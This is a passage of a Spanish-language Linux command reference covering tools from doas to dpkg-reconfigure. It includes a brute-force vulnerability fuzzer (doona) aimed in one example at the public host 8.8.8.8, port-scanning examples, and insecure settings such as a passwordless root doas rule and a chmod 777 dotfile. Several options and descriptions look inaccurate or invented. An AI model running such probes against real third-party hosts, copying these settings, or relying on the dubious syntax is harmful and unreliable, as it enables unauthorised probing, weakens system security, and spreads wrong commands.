Prompt=normal
Para no verificar nunca nuevas versiones:
Prompt=never
Estas modificaciones son válidas también para update-manager [ver]
# do-release-upgrade -d


doas
Permite ejecutar comandos como otro usuario, generalmente con privilegios de root similar a sudo. Primero crear el archivo:
# nano /etc/doas.conf
  - entrar el grupo del usuario con permisos root para ejecutar algún comando [cmd apt]:
  permit :USER as root cmd apt
  - permitir a usuario ejecutar todos los comandos como root
  permit nopass USER as root
  - Prohibir al usuario juan ejecutar el comando fdisk
  deny juan cmd fdisk
Especificar los permisos y propietario del archivo:
# chown -c root:root /etc/doas.conf
# chmod -c 0400 /etc/doas.conf
Luego el usuario especificado en el archivo podrá, por ejemplo, ejecutar:
$ doas apt update (en el primer caso)
$ doas -u root bash (iniciar sesión como root)
Algunas opciones que podemos colocar en el archivo de configuración:
        permit nopass :otros (Permitir que todos los usuarios del grupo "otros" realicen acciones como root sin autenticación)
        permit persist USER (Una vez que el usuario se autentica exitosamente, no solicitar una contraseña nuevamente por algún tiempo.


doc-central
Navegador de documentación basado en la Web para explorar la que se ha instalado en el sistema y que se ha registrado en el subsistema doc-base. Se accede con el navegador en http://localhost/dc/ o directamente con:
$ doccentral


doc-debian
El Proyecto Debian es una asociación de individuos que han hecho causa común para crear un sistema operativo libre. En este paquete, se encuentra: Manifiesto de Debian Linux, Constitución del Proyecto Debian, Contrato Social de Debian, Directrices de Software Libre de Debian, Documentación del Sistema de Seguimiento de Fallos de Debian y una introducción a las listas de correo de Debian. Todos estos archivos están disponibles en http://ftp.debian.org/debian/doc/.


docbook
No es tanto un comando como un conjunto de definiciones de tipo de documento [DTD] para SGML o XML, orientado a la redacción de documentos técnicos como libros, manuales y artículos de software. Lo que puede hacer DocBook es procesar documentos XML/SGML para convertirlos en formatos legibles como HTML, PDF, ePub o texto plano. Se precisan otros paquets para procesar documentos DocBook: xmlto [Convertir a varios formatos], xslproc [Procesa archivos XML con hojas de estilo XSL], dblatex [Convierte DocBook a PDF usando LaTeX]  psgml [para editar], opensp [validar]  docbook-xsl o docbook-dsssl [formatear].
Este es un ejemplo de un archivo XML en formato DocBook (mi_documento.xml):
<?xml version="1.0"?>
      <!DOCTYPE article PUBLIC "-//OASIS//DTD DocBook XML V4.5//EN"
          "http://www.oasis-open.org/docbook/xml/4.5/docbookx.dtd">
      <article>
        <title>Guía rápida de DocBook</title>
        <section>
            <title>Introducción</title>
            <para>DocBook es un formato estándar para escribir documentación técnica.</para>
        </section>
        <section>
            <title>Ejemplo</title>
            <para>Este es un documento de ejemplo en formato DocBook.</para>
        </section>
      </article>
$ xmlto html mi_documento.xml (generará un archivo HTML llamado mi_documento.html
$ dblatex mi_documento.xml (generará un archivo mi_documento.pdf)
$ xmlto man mi_documento.xml (generará un archivo mi_documento.1, que se puede ver como una página de manual [man ./mi_documento.1])
$ xsltproc -o salida.html /usr/share/xml/docbook/stylesheet/nwalsh/html/docbook.xsl mi_documento.xml (utiliza una hoja de estilo predefinida para generar el archivo HTML)


docdiff
compara dos archivos y muestra la diferencia. Compara archivos palabra por palabra, carácter por carácter o línea por línea. Tiene varios formatos de salida, como HTML/XHTML, tty, Manued o marcado definido por el usuario. Admite varias codificaciones y caracteres de final de línea, incluidos ASCII, UTF-8, EUC-JP, Shift_JIS, CR, LF y CRLF.
$ docdiff archivo1.txt archivo2.txt (mostrará las diferencias entre `archivo1.txt` y `archivo2.txt`, mostrando cada cambio palabra por palabra)
$ docdiff archivo1.iso8859-1 archivo2.utf-8 (compara un archivo codificado en ISO-8859-1 con otro en UTF-8)
$ docdiff archivo1_unix archivo2_dos (comparación de archivos con diferentes caracteres de fin de línea: Unix vs DOS)
$ docdiff --added-only archivo1.txt archivo2.txt ( muestra solo las lineas añadidas en un archivo)
$ docdiff --removed-only archivo1.txt archivo2.txt (muestra solo las eliminadas en un archivo)
$ docdiff --ignore-blank-lines archivo1.txt archivo2.txt (ignora las líneas vacías al realizar la comparación)
$ docdiff directorio1 directorio2 (comando compara todos los archivos en los dos directorios especificados)
$ docdiff -vwb archivo1 archivo2 (modo verbose, ignora espacios y tabulaciones e ignora mayúsculas y minúsculas)


dochelp
Documentación sobre comandos del sistema.
$ dochelp list (Muestra el listado)
$ dochelp update (actualizar la página de resumen)
$ dochelp search ip (buscar la documentación del comando "ip")


docknot
Generador de sitios web estáticos creado en torno a un lenguaje de macros llamado thread, con soporte especial para gestionar versiones de software. Además de crear un sitio web, puede generar archivos tar para distribución y documentación de paquetes.
Estructura básica de un proyecto de software llamado mi-proyecto. La estructura de directorios podría ser:
$ tree mi_proyecto
      mi-proyecto/
          ├── docknot.yaml
          ├── templates/
          │   └── main.thread
          ├── docs/
          │   └── index.md
          └── versions/
              ├── v1.0.yaml
              └── v2.0.yaml
El archivo docknot.yaml contiene la configuración principal del proyecto. Un ejemplo simple podría ser:
       project_name: "Mi Proyecto"
       version: "1.0"
       author: "Tu Nombre"
       description: "Descripción de mi proyecto."
El archivo de Versión v1.0.yaml para una versión específica podría verse así:
       version: "1.0"
       release_date: "2023-01-01"
       features:
        - Funcionalidad 1
        - Funcionalidad 2
La plantilla main.thread podría definir cómo se verá el contenido del sitio. Un ejemplo simple:
       Copiar
       <html>
       <head>
           <title>{{ project_name }}</title>
       </head>
       <body>
           <h1>{{ project_name }}</h1>
           <p>{{ description }}</p>
       </body>
       </html>
Finalmente, para generar el sitio, ejecutar en la terminal desde el directorio del proyecto:
$ docknot build
$ docknot package (crear un archivo tar)


doctest
Herramienta para verificar automáticamente las documentación y ejemplos en los comentarios del código fuente. Analiza los comentarios del código fuente buscando ejemplos de código entre paréntesis o corchetes. Luego ejecuta estos ejemplos y compara sus resultados con lo esperado.


docutils-common
No es un comando en sí mismo, sino que forma parte del paquete docutils [ver python3-docutils]: Es una biblioteca de Python que se utiliza para procesar texto en formato reStructuredText [reST] que es un sistema de sintaxis y análisis de texto simple, fácil de leer y que permite ver lo que se obtiene. Es útil para la documentación de programas en línea, como cadenas de documentación de Python, para crear rápidamente páginas web sencillas y para documentos independientes.
Toda la información en file:///usr/share/docutils/parsers/rst/include


docx2txt
Herramienta para generar archivos de texto sin formato equivalentes a partir de documentos .docx de Microsoft, conservando parte del formato y la información del documento, que la conversión de texto de MS omite, junto con las conversiones de caracteres apropiadas para una buena experiencia de texto en ascii o utf-8.
$ docx2txt archivo.docx > salida.txt (convierte archivo.docx y lo guarda en salida.txt)


dodgy
Busca líneas de aspecto sospechoso en el código Python. Se utiliza para analizar el código y detectar patrones que pueden indicar problemas de seguridad, de aspecto "sospechoso" o mala práctica, como la inclusión accidental de información sensible, contraseñas, claves secretas codificadas o archivos que contienen datos que no deberían estar ahí.
$ dodgy mi_codigo.py (analizará el código en busca de patrones que puedan ser problemáticos)
Si el código del archivo.py que se analiza contine linea, por ejemplo:
      password = "mi_contraseña_secreta"
O parecida a:
      api_key = "12345-abcde-67890-fghij"
dodgy las marcaría como sospechosas porque la primera almacena una contraseña directamente en el código y la otra porque las claves API no deberían estar codificadas directamente en el código fuente.


dog
Parecido a cat.


dokujclient
Herramienta para interactuar [leer, escribir...] con una instancia de Dokuwiki de forma interactiva.
$ dokujclient --server=https://mi-dokuwiki.com --user=miusuario --password=miclave pagelist (muestra una lista de todas las páginas disponibles en la instancia remota de DokuWiki)
$ dokujclient --server=https://mi-dokuwiki.com --user=miusuario --password=miclave getpage mi_pagina (obtiene el contenido de la página mi_pagina y lo muestra en la terminal)
$ dokujclient --server=https://mi-dokuwiki.com --user=miusuario --password=miclave putpage nueva_pagina.txt "Este es el contenido de la nueva página." (si nueva_pagina.txt no existe, la crea; si ya existe, actualiza su contenido)
$ dokujclient --server=https://mi-dokuwiki.com --user=miusuario --password=miclave delpage pagina_a_borrar (elimina la página pagina_a_borrar de la instancia remota)
$ dokujclient --server=https://mi-dokuwiki.com --user=miusuario --password=miclave search "documentación" (devuelve una lista de páginas que contienen el término documentación)


dokuWiki
Permite acceder directamente a la interfaz de DokuWiki desde la línea de comandos para interactuar de forma básica con las páginas del wiki. Esta wiki está destinada principalmente a crear documentación de cualquier tipo. Tiene una sintaxis simple que garantiza que los archivos de datos sigan siendo legibles fuera de la wiki y facilita la creación de textos estructurados. Todos los datos se almacenan en archivos de texto sin formato y no requiere base de datos.
$ dokuWiki --server=https://mi-dokuwiki.com --user=miusuario --password=miclave (abre el cliente y ya se pueden usar comandos internos como getpage, putpage, delpage, etc., para interactuar con el contenido)
dokuWiki> getpage inicio (obtener una página desde el modo interactivo)
dokuWiki> putpage mi_pagina "Este es el nuevo contenido de la página." (actualizar el contenido de una página desde el modo interactivo)
dokuWiki> search "configuración" (buscar páginas)


donkey
Calculadora de contraseñas de un solo uso [One Time Password - OTP]. Dado que la entrada se imprime en stdout, no en /etc/skeykeys, puede ser enviada fácilmente a un operador remoto por correo electrónico, con una firma PGP o algo similar. Estas contraseñas son útiles en situaciones donde se necesita una autenticación segura, ya que solo son válidas para una única sesión o transacción. Una vez utilizada, la contraseña ya no es válida, lo que reduce el riesgo de que sea comprometida.
$ donkey -s "secreto_compartido" -c 12345 (Especifica el secreto compartido y el contador o valor de tiempo para generar una contraseña de un solo uso)
$ donkey -s "secreto_compartido" -c 12345 | mail -s "Contraseña de un solo uso" usuario@example.com (generará la contraseña y la enviará por correo electrónico al usuario remoto)


dontzap
Activa CRTL+ALT+Retroceso para reiniciar las X
dontzap -d     (Lo activa)
dontzap -e      (Lo desactiva)


doodle
Busca archivos en el disco duro mediante la búsqueda de patrones en metadatos. Extrae metadatos específicos del formato de archivo y crea un árbol de sufijos para indexar los archivos. Luego, se puede buscar rápidamente en el índice. Es similar a locate, pero puede aprovechar información como las etiquetas ID3.
$ doodle -b $HOME (indexar todo el contenido de nuestra home)
Se puede añadir en ~/.bashrc las siguientes lineas:
         alias updatedb="doodle -bn -d /var/lib/doodle/doodle-locate-db -l libextractor_filename /"
         alias locate="doodle -d /var/lib/doodle/doodle-locate-db"


doodled
Contiene el demonio para mantener la base de datos de Doodle actualizada automáticamente
$ /etc/init.d/doodled status (comprobar si está activo)


dool
Herramienta para monitorear muchos aspectos del sistema: CPU, memoria, red, promedio de carga, etc.
$ dool --more 3  (actualizar datos cada 3 segundos. Por defecto cada segundo)
$ dool --net -N enp1s0 (del tráfico de red de la interfaz espedificada)
$ dool --cpu --time 2 (cada 2 segundos)
$ dool --full (monitorear todos los aspectos de la aplicación)


doona
Herramienta de seguridad basada en la técnica de fuerza bruta para detectar vulnerabilidades en servicios de red. Es una bifurcación de la herramienta BED [Bruteforce Exploit Detector].
$ doona -m http -p 80 (detecta las del módulo HTML y puerto 80. Otros módulos son DICT, FINGER, FTP, HTTP_MORE, HTTP_SP, HTTP_WEBDAV, IMAP, IRC, LPD, NNTP, PJL, POP, PROXY, RTSP, SMTP, SOCKS4, SOCKS5, TFTP y WHOIS)
$ doona -m http -t 192.168.18.6 -p 80 -o 4 -M 3 (especificando host, por defecto localhost, 4 segundos de espera después de cada prueba y realizar 3 pruebas y salir)
$ doona -m proxy -t 8.8.8.8 -p 53 -M 3


dos2unix
Convertir un formato de fichero texto MSDOS a UNIX.
$ dos2unix filedos.txt fileunix.txt


dosage
Descargador y archivador de tiras cómicas. Puede recuperar solo la última tira de una tira cómica, ponerse al día con la última tira descargada o descargar una tira para una fecha o índice en particular si el diseño del sitio web lo permite.
$ dosage xkcd (descargará las tiras cómicas de "xkcd" y las guardará en un directorio local)
$ dosage xkcd dilbert calvinandhobbes (descargar las tiras de "xkcd", "Dilbert" y "Calvin and Hobbes")
$ dosage -u xkcd (actualizar las tiras de "xkcd" que ya se tienen descargadas)
$ dosage -l (mostrar una lista de todos los cómics soportados por dosage)
$ dosage -o comics/directorio xkcd (descargará las tiras de "xkcd" y las guardará en el directorio especificado)
$ dosage -s 2023-01-01 -e 2023-01-31 xkcd (descargará las tiras de "xkcd" publicadas entre el 1 de enero de 2023 y el 31 de enero de 2023)


dosbox
Emulador x86 con gráficos diseñado para ejecutar juegos antiguos de DOS en plataformas modernas. Es especialmente útil para juegos antiguos que no funcionan en sistemas operativos actuales debido a diferencias en la arquitectura y el manejo de hardware.
$ dosbox (abrirá una ventana con el símbolo del sistema donde se podrá ejecutar comandos como si se estuviera en un entorno DOS)
1--
Ejemplo de cómo usar DOSBox para ejecutar un juego antiguo
$ mkdir ~/dosgames (crear un directorio para el Juego)
Copiar el juego antiguo en ese directorio.
$ dosbox (iniciar DOSBox)
> mount c ~/dosgames (montar el directorio ~/dosgames que será tratado como la unidad C: dentro del entorno DOS)
> c: (entrar en la unidad c:)
> juego.exe (el juego debería iniciarse)
> exit (y presionar "Enter" para salir de DosBox)
Nota.- CTRL+F5 para guardar el estado del juego y CTRL+F9 para cargarlo más tarde.


doscan
Está diseñada para escanear interfaces de red y detectar servicios activos, como puertos abiertos, servicios en ejecución, etc
$ doscan 192.168.18.6 -p 80 (escanear todas las IP en el rango especificado y detectar servicios activos en le puerto 80)
$ doscan 192.168.18.10 -p 1-1000 (escanear un rango específico de puertos)
$ doscan -b 100 192.168.18.6 -p 22 (lee como maximo 100 bites)


doschk
Se utiliza para verificar si los nombres de archivos en un sistema Linux podrían causar problemas al ser interpretados como nombres de archivos en sistemas DOS y SYSV que están limitados a 14 caracteres.
$ doschk (buscará nombres de archivos que puedan causar conflictos con los sistemas DOS)
$ doschk /ruta/del/directorio (analizar solo los archivos y subdirectorios del directorio especificado)
$ find archivo.txt -print | doschk (si no produce ningún resultado, significa que el archivos son compatible con MS-DOS)
Nota.- En sistemas modernos, este tipo de verificación generalmente no es necesario ya que la mayoría de los sistemas operativos actuales han superado las limitaciones de DOS.


dosfsck
Comprobar y reparar sistemas de archivos MS-DOS
# dosfsck -altrvV /dev/sdbx
-a (repara automaticamente)
-l  (Lista las rutas de los archivos procesados)
-t  (Marca los clusters inaccesibles como dañados.)
-r  (Repara el sistema preguntando cuando hay varias soluciones)
-v  (Modo detallado)
-V  (Realiza una pasada de verificación)


dose-builddebcheck
Comprueba si se pueden satisfacer las dependencias de compilación. Este software comprueba, dada una colección de secciones de paquetes fuente y una colección de secciones de paquetes binarios de paquetes Debian, si los paquetes binarios pueden satisfacer las dependencias de compilación de cada paquete fuente.
$ dose-builddebcheck -v -f -e --deb-native-arch=amd64 /var/lib/apt/lists/ftp.debian.org_debian_dists_bookworm_main_binary-amd64_Packages /var/lib/apt/lists/ftp.debian.org_debian_dists_bookworm_main_source_Sources


dose-distcheck
Comprueba si se pueden satisfacer las dependencias de los paquetes. Este software comprueba para cada paquete de una distribución si es posible satisfacer sus dependencias y conflictos dentro de esta distribución. Consta de las aplicaciones: dose-debcheck [para paquetes Debian], dose-distcheck [evitar situaciones en las que una actualización de paquetes pueda romper dependencias importantes], dose-rpmcheck [para paquetes rpm] y dose-eclipsecheck [para complementos OSGi]
# dose-debcheck -v /var/cache/apt/archives/*.deb (verifica si las dependencias de los paquetes .deb en /var/cache/apt/archives/ pueden satisfacerse entre sí)
# apt-cache dumpavail | dose-debcheck (comprobar la distribución completa desde la lista de paquetes disponibles)
# dose-debcheck | grep "unsat" (mostrará únicamente los paquetes con dependencias insatisfechas)
# apt-get -s dist-upgrade | dose-debcheck (simula una actualización y comprueba si rompe dependencias)


dose-extra
Herramientas adicionales de control de calidad de la biblioteca Dose3 para realizar análisis más específicos, como la coinstalación de paquetes, la detección de dependencias rotas, y la identificación de paquetes obsoletos analizando metadatos de paquetes de software. Estas son ceve [analizador de metadatos general que admite distintos formatos de entrada y de salida], dose-challenged [herramienta específica de Debian para comprobar qué paquetes seguramente se volverán desinstalables cuando un paquete existente se actualice a una versión más nueva], dose-deb-coinstall ,[herramienta específica de Debian para comprobar si un conjunto de paquetes se puede instalar en su totalidad]
# dose-outdated (encontrar paquetes que no se pueden instalar con respecto a un repositorio de paquetes)
# dose-challenged Packages.gz (detecta los paquetes del archivo Packages.gz que no pueden instalarse porque tienen dependencias no satisfechas)
# dose-deb-coinstall ./libc6_2.31-13_amd64.deb ./gcc-10-base_10.2.1-6_amd64.deb (verifica si las versiones especificadas de libc6 y gcc-10-base son compatibles y pueden instalarse juntas)
# dose-outdated Sources.gz Packages.gz (detecta paquetes obsoletos en el archivo Packages.gz comparándolos con las versiones más recientes en Sources.gz)
# dose-challenged /var/lib/apt/lists/ftp.debian.org_debian_dists_bookworm_main_binary-amd64_Packages (muestra todos los paquetes "main" de la distribución bookworm que tienen problemas de instalabilidad)
# dose-outdated /var/lib/apt/lists/ftp.debian.org_debian_dists_bookworm_main_binary-amd64_Packages /var/lib/apt/lists/ftp.debian.org_debian_dists_bookworm_main_source_Sources (paquetes binarios que han quedado obsoletos)


dosfstools
utilidades para crear, verificar, reparar y etiquetar sistemas de archivos FAT [FAT12, FAT16 y FAT32] en dispositivos de almacenamiento como USB, discos duros y tarjetas SD. Incluye las herramientas dosfsck, dosfslabel, fatlabel, fsck.fat, fsck.msdos, fsck.vfat, mkdosfs, mkfs.fat, mkfs.msdos y mkfs.vfat
$ mkfs.fat -F 32 /dev/sdb1 (crea un sistema de archivos FAT32 en el dispotifivo especificado)
$ mkfs.msdos /dev/sdb1 (equivalente al anterior)
$ fsck.fat -a /dev/sdb1 (repara automáticamente los errores detectados en el dispositivo)
$ fsck.fat -n /dev/sdb1 (solo verificar sin hacer cambios un sistema de archivos FAT)
$ dosfsck -a /dev/sdb1 (equivaleente al anterior)
$ fatlabel /dev/sdb1 (mostrar la etiqueta de volumen)
$ fatlabel /dev/sdb1 NUEVA_ETIQUETA (establecer una nueva etiqueta)
$ dosfslabel /dev/sdb1 NUEVA_ETIQUETA (equivalente al anterior)


dot
Lenguaje de descripción de gráficos. Los gráficos generalmente se almacenan con la extensión de nombre de archivo .gv o .dot aunque se prefiere .gv para evitar confusiones.
$ gpicview output.svg (Para visualizar los gráficos de los siguientes ejemplos)
$ echo 'digraph { a -> b }' | dot -Tsvg -o output.svg
$ echo 'digraph { a -> b }' | dot -Tpng -Gfontcolor=red -Glabel="Gráfico importante" -o output.png
$ echo 'digraph { a -> b }' | dot -Tsvg -Nfontcolor=red -Nshape=rect -o out.svg
$ echo 'digraph { a -> b }' | dot -Tsvg -Ecolor=red -Earrowhead=diamond -o out.svg
$ echo 'digraph { a -> b }' | dot -Tsvg -o output.svg
$ dot -Tsvg -O ~/graph1.gv ~/graph2.gv (generar automaticamente graph1.svg y graph2.svg)
$ dot -P -Tsvg -o plugins.svg (ver gráfico de todos los plugins del ejecutable)
Algunos ejemplos más complejos:
1.-
$ echo 'digraph sample3 {
A -> {B ; C ; D}
C -> {B ; A}
}' | dot -Tpng -Nfontcolor=red -Nshape=oval -Glabel="Gráfico importante" -Nstyle=bold -o output.png
2.-
$ echo 'digraph test123 {
               a -> b -> c;
               a -> {x y};
               b [shape=box];
               c [label="hello\nworld",color=blue,fontsize=24,
                    fontname="Palatino-Italic",fontcolor=red,style=filled];
               a -> z [label="hi", weight=100];
               x -> z [label="multi-line\nlabel"];
               edge [style=dashed,color=red];
               b -> x;
               {rank=same; b x}
       }
' | dot -Tpng -Nfontcolor=red -Nshape=box -Glabel="Gráfico importante" -Nstyle=invis -o output.png


dot2tex
El objetivo de la herramienta es dar a los gráficos generados por Graphviz [DOT] un aspecto y un funcionamiento más compatibles y que se integra perfectamente con LaTeX.
$ dot2tex -o grafico.tex grafico.dot (generar un archivo grafico.tex de un .dot que se puede incluir en un documento LaTeX usando \input{grafico.tex})


dotdrop
Facilita la administración de archivos "dotfile" entre diferentes máquinas. Estos archivos se utilizan para personalizar entornos de usuario en sistemas Unix/Linux.
Contiguración mínima:
$ sudo mkdir dotdrop
$ cd dotdrop
$ mkdir dotfiles
$ sudo nano config.yaml
       config:
         backup: true
         banner: true
         create: true
         dotpath: dotfiles
         ignoreempty: false
         keepdot: false
         longkey: false
         showdiff: false
         workdir: ~/.config/dotdrop
       dotfiles:
       profiles:
$ sudo dotdrop import ~/.bashrc (importar un archivo al directorio)
Se añadiran al archivo config.yaml los siguientes datos:
       dotfiles:
         f_bashrc:
           src: home/pep/.bashrc
           dst: /home/pep/.bashrc
         chmod: '777'
       profiles:
         debian:
           dotfiles:
           - f_bashrc


dothost
Herramienta que se utiliza para realizar búsquedas de DNS en red y presentar los resultados en formatos compatibles con Graphviz generando representaciones visuales con la información obtenida. Los formatos de salida admitidos son: ascii, boxart, html, svg, dot, txt, vcg, gdl, graphml, gif, jpg, pdf, png y ps.
$ dothost example.com | graph-easy --as html (guardar el gráfico como graph.html)
$ dothost example.com | graph-easy --as svg (guardar como, por defecto, graph.svg)
$ dothost example.com | graph-easy --as jpg (guarda como graph.jpg)
$ dothost example.com | graph-easy --as pdf (como graph.pdf)
$ dothost example.com | graph-easy (lo muestra en pantalla)


douceur
Proporciona un analizador CSS y código inliner HTML.
$ douceur parse archivo.css
$ douceur inline /var/www/html/index.html


dov4l
Programa para configurar y consultar la configuración de dispositivos video4linux [V4L]. Puede configurar propiedades como frecuencia, sintonizador, canal de entrada, modo, brillo, tono, color, contraste, blancura, paleta, ancho y alto de un dispositivo video4linux una API y un conjunto de drivers para dispositivos de captura de video en Linux, como cámaras web, tarjetas de captura de video, sintonizadores de TV, etc.. También puede consultar la configuración actual.
$ dov4l -d /dev/video0 (muestra la configuración actual del dispositivo de video en /dev/video0, incluyendo propiedades como brillo, contraste, saturación, etc)
$ dov4l -q (lo mismo que el anterior. Si no se especifica dispositivo, por defecto es /dev/video0)
$ dov4l -b 150 (ajusta el brillo del dispositivo a un valor de 150 [el rango típico es de 0 a 255])
$ dov4l -d /dev/video0 --contrast=64 (ajusta el contraste del dispositivo a un valor de 64)
$ dov4l -d /dev/video0 --format=YUYV (configura el dispositivo para usar el formato de video YUYV)
$ dov4l -f 213.25 (ajusta la frecuencia del sintonizador a 213.25 MHz)
$ dov4l -c 5 (cambia el canal del sintonizador al número 5)
$ dov4l -t 1 -i 2 (selecciona el sintonizador 1 y configura el canal de entrada a 2)
$ dov4l -d /dev/video0 --list-controls (lista todos los controles que puedes ajustar en el dispositivo, como brillo, contraste, saturación...)
$ dov4l -d /dev/video0 --capture=frame.jpg (captura un frame del dispositivo y lo guarda como frame.jpg)
$ dov4l -x 640 -y 480 (resolución de salida del dispositivo)


downgrade
Bajar versión a un programa instalado.
# downgrade firefox
Mostrará la salida: “please choose a version, [s]earch A.R.M., or [q]uit:”
Pulsando “s” mostrará las versiones disponibles para ser instaladas.


downtimed
Demonio para monitorear y llevar un registro del tiempo de inactividad del sistema operativo, paradas y bloqueos. Los registros se realizan en /var/lib/downtimed/
# service downtimed status (para saber si está activo)


dphys-config
Herramienta utilizada para la distribución de archivos de configuración personalizados en múltiples máquinas. El objetivo principal es mantener actualizados y sincronizados archivos de configuración específicos a través de una red.
# dphys-config sync (sincronizar las configuraciones de todos los clientes de la red)
# dphys-config force-sync (forzar la sincronización y sobrescribir configuraciones locales de todos los clientes de la red)
# dphys-config test (verificar qué cambios se realizarán sin aplicarlos)


dphys-swapfile
Generar y usar automáticamente un archivo de intercambio, no una partición de intercambio. Este script init.d existe para que no sea necesario tener una partición de intercambio de tamaño fijo. En su lugar, se instala en el sistema sin partición de intercambio y luego se ejecuta la aplicación y automaticamente calcula el tamaño de la swap para adaptarse al tamaño actual de la RAM. De manera predeterminada y, por lo tanto, en la instalación, crea un archivo de intercambio dos veces más grande que la cantidad actual de RAM con un límite superior de 2 GB. También es muy útil cuando se incluye en tarjetas SD, memorias USB o imágenes de disco que se distribuyen y ejecutan en muchas máquinas con diferentes cantidades de RAM, por ejemplo, diferentes modelos de Raspberry Pi o imágenes en la nube.
La configuración de dphys-swapfile se realiza mediante el archivo:
# nano /etc/dphys-swapfile
Con el contenido a modo de ejemplo:
# Tamaño inicial del archivo de intercambio en MB
CONF_SWAPSIZE=1024
#
# Tamaño máximo del archivo de intercambio en MB (para crecimiento dinámico)
CONF_MAXSWAP=2048
#
# Ubicación del archivo de intercambio
CONF_SWAPFILE=/var/swap
# dphys-swapfile setup (inicializar el archivo de intercambio después de cada modificación del archivo de configuración)
# dphys-swapfile swapon (activarlo)
# dphys-swapfile swapoff (desactivar el archivo de intercambio)
# rm /var/swap (eliminar el archivo de intercambio, despues de desactivar el archivo)


dpigs
[debian-goodies]. Muestra los paquetes que ocupan más espacio.
$ dpigs (Los primeros diez 10. Opción por defecto)
$ dpigs -n 20 (Los primeros 20)
$ dpigs -S (Muestra los paquetes fuente más grandes instalados en el sistema)
$ dpigs -H -n 15 (en medidas entendibles y los 15 que ocupan más espacio)


dpkg
Gestor de programario de distros derivadas de Debian
# dpkg -i paquete   (Instalación de paquetes .deb)
# dpkg -r paquete   (Desinstala un paquete)
# dpkg --purge paquete    (Desinstala junto sus archivos de configuración)
# dpkg --audit   (Visualizar paquetes instalados parcialmente)
# dpkg --force -r paquete  (Fuerza la desinstalación de un paquete)
# dpkg --force-all -r paquete  (Fuerza más la desinstalación de un paquete)
# dpkg --purge --force-all paquete (Otra opcioón para desinstalar un paquete)
# dpkg -c paquete   (Muestra los ficheros de un paquete)
# dpkg --yet-to-unpack  (paquetes descargados sin instalar)
# dpkg -C   (Muestra los instalados parcialmente)
# dpkg -L paquete  (Ficheros que se instalaron con un paquete)
$ dpkg -l inkscape  (Conocer si un paquete está instalado y su versión)
# dpkg -l 'emacs*' (listará todos los paquetes instalados o no, cuyo nombre coincida con el argumento pasado)
# dpkg -l 'emacs*' | grep '^un' (Mostrar los no instalados)
# dpkg -S fichero    (Muestra a qué paquete pertenece un fichero)
# dpkg --get-selections   (Muestra todos los paquetes instalados en el sistema)
# dpkg --get-selections | cut -f1 (Lo mismo más fino)
# dpkg --get-selections > lista.txt    (Los manda a un fichero)
# dpkg --get-selections | grep python (muestra todos los paquetes python)
# dpkg -l > llistat.txt      (Manda a un fichero todos los paquetes Debian)
# dpkg --status paquete  (Info, dependencias, recomendaciones, sugerencias)
# dpkg -install paquete --force-conflicts (instalar un paquete conflicitivo)
# dpkg --print-architecture (mostrar la arquitectura de un pc)
# dpkg --configure -a  (R. inconsistencias o procesos despues de un cuelgue)
# dpkg-query -W paquete (Ver versión de un paquete)
# dpkg -i --force-overwrite /var/cache/apt/archives/paquete.deb (forzar install)
# dpkg -b deb paquete.deb (Convertir la carpeta “deb” en un archivo “.deb”)
# dpkg -L util-linux | grep -E '/bin/|/sbin/' (ver los ejecutables de un paquete)
1.-
En ocasiones, algún paquete medio o mal instalado puede bloquear la aplicación. En estos casos puede usarse:
# rm /var/lib/apt/lists/* -vf
Y a continuación:
# apt-get update
2.-
Forzar desinstalación de paquetes resistentes.
	# dpkg --purge --force-remove-reinstreq paquete
	# dpkg --listfiles paquete_dañado
	# gedit /var/lib/dpkg/status (eliminar la sección paquete_dañado)
	# gedit /var/lib/dpkg/available   (eliminar la sección paquete_dañado)
	# dpkg -l | grep ^rc | awk '{print $2}' | sudo xargs dpkg -P  (suprimir residuos de instalaciones)
3.-
Otra forma de forzar la desinstalación de paquetes conflictivos:
	# rm /var/lib/dpkg/info/paquete
	# dpkg -r --force-remove-reinstreq paquete
	# dpkg -l | sed '/^rc/!d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/' | xargs -r sudo apt-get -y purge (Suprimir configuraciones residuales y huerfanas)
4.-
Otro modo de suprimir archivos de configuración huerfanos (rc):
	# dpkg -l | grep ^rc (Comprobar si tenenos paquetes de estas caracteristicas)
	# dpkg -P $(dpkg -l |awk '/^rc/ { print $2 }') (Eliminarlos)
5.-
Añadir arquitectura 386 a una máquina amd64 para permitir instalar paquetes sólo disponibles para aquella arquitectura:
# dpkg --add-architecture i386
# apt-get update
6.-
Limpiar paquetes obsoletos:
# dpkg -l | grep -i ^rc (Para visualizarlos)
# dpkg -l |grep -i ^rc | cut -d " " -f 3 | xargs dpkg --purge (Para eliminarlos)
7.-
Otro proceso para reparar paquetes rotos en el sistema
    # dpkg --configure -a (reconfigurar posibles paquetes pendientes)
    # apt-get clean && sudo apt-get autoclean (limpiar caché)
    # rm /var/lib/apt/lists/lock && rm /var/cache/apt/archives/lock && rm /var/lib/dpkg/lock
    # apt-get update --fix-missing (regenerar listados de paquetes de los repositorios)
    # apt-get install -f (corregir dependencias rotas


dpkg-awk
Script de Gawk para analizar /var/lib/dpkg/{status,available} y paquetes. Este script puede analizar los archivos de base de datos de dpkg. Puede hacer expresiones regulares en los campos y obtener solo lo que desea. También se puede hacer que muestre ciertos campos. Como beneficio adicional, hay una opción para ordenar la salida.
$ dpkg-awk > paquetes (listar todos los paquetes instalados y guardarlos en un archivo)
$ dpkg-awk "Status: .* installed$" -- Package Version Status (mostrará todos los paquetes instalados, con solo los campos enumerados)
$ dpkg-awk -f=/var/lib/dpkg/available "Package:^[aA].*" -- Package Version (mostrará todos los paquetes disponibles que comiencen con la letra 'A'.)
$ dpkg-awk 'Package ~ /python/' (buscar todos los paquetes que contienen la palabra "python" en su nombre)
$ dpkg-awk -f=/var/lib/dpkg/available -- Package Homepage (mostrar sólo nombre del paquete y su página web)


dpkg-depcheck
Determina los paquetes utilizados para ejecutar un comando. Este programa ejecuta el comando especificado bajo strace y luego determina y saca los paquetes usados en el proceso.
$ dpkg-depcheck -b ip a
$ dpkg-depcheck -a ls


dpkg-divert
Herramienta para instalar un paquete en una ubicación no predeterminada. Las ubicaciones alternativas de un archivo que se realizan mediante la orden dpkg-divert son una forma de obligar a dpkg a instalar un archivo en una ubicación alternativa y no en su ubicación por defecto. Su utilización es una práctica en desuso.


dpkg-query
Herramienta para buscar información del paquete referenciado en la base de datos.
$ dpkg-query -l gedit (Muestra arquitectura, versión y descripción de gedit)
$ dpkg-query -L gedit (archivos instalados en el sistema desde el nombre del paquete)
$ dpkg-query -s gedit (muestra el estado del paquete)


dpkg-reconfigure
Reconfigura los paquetes después de que ya se hayan instalado.
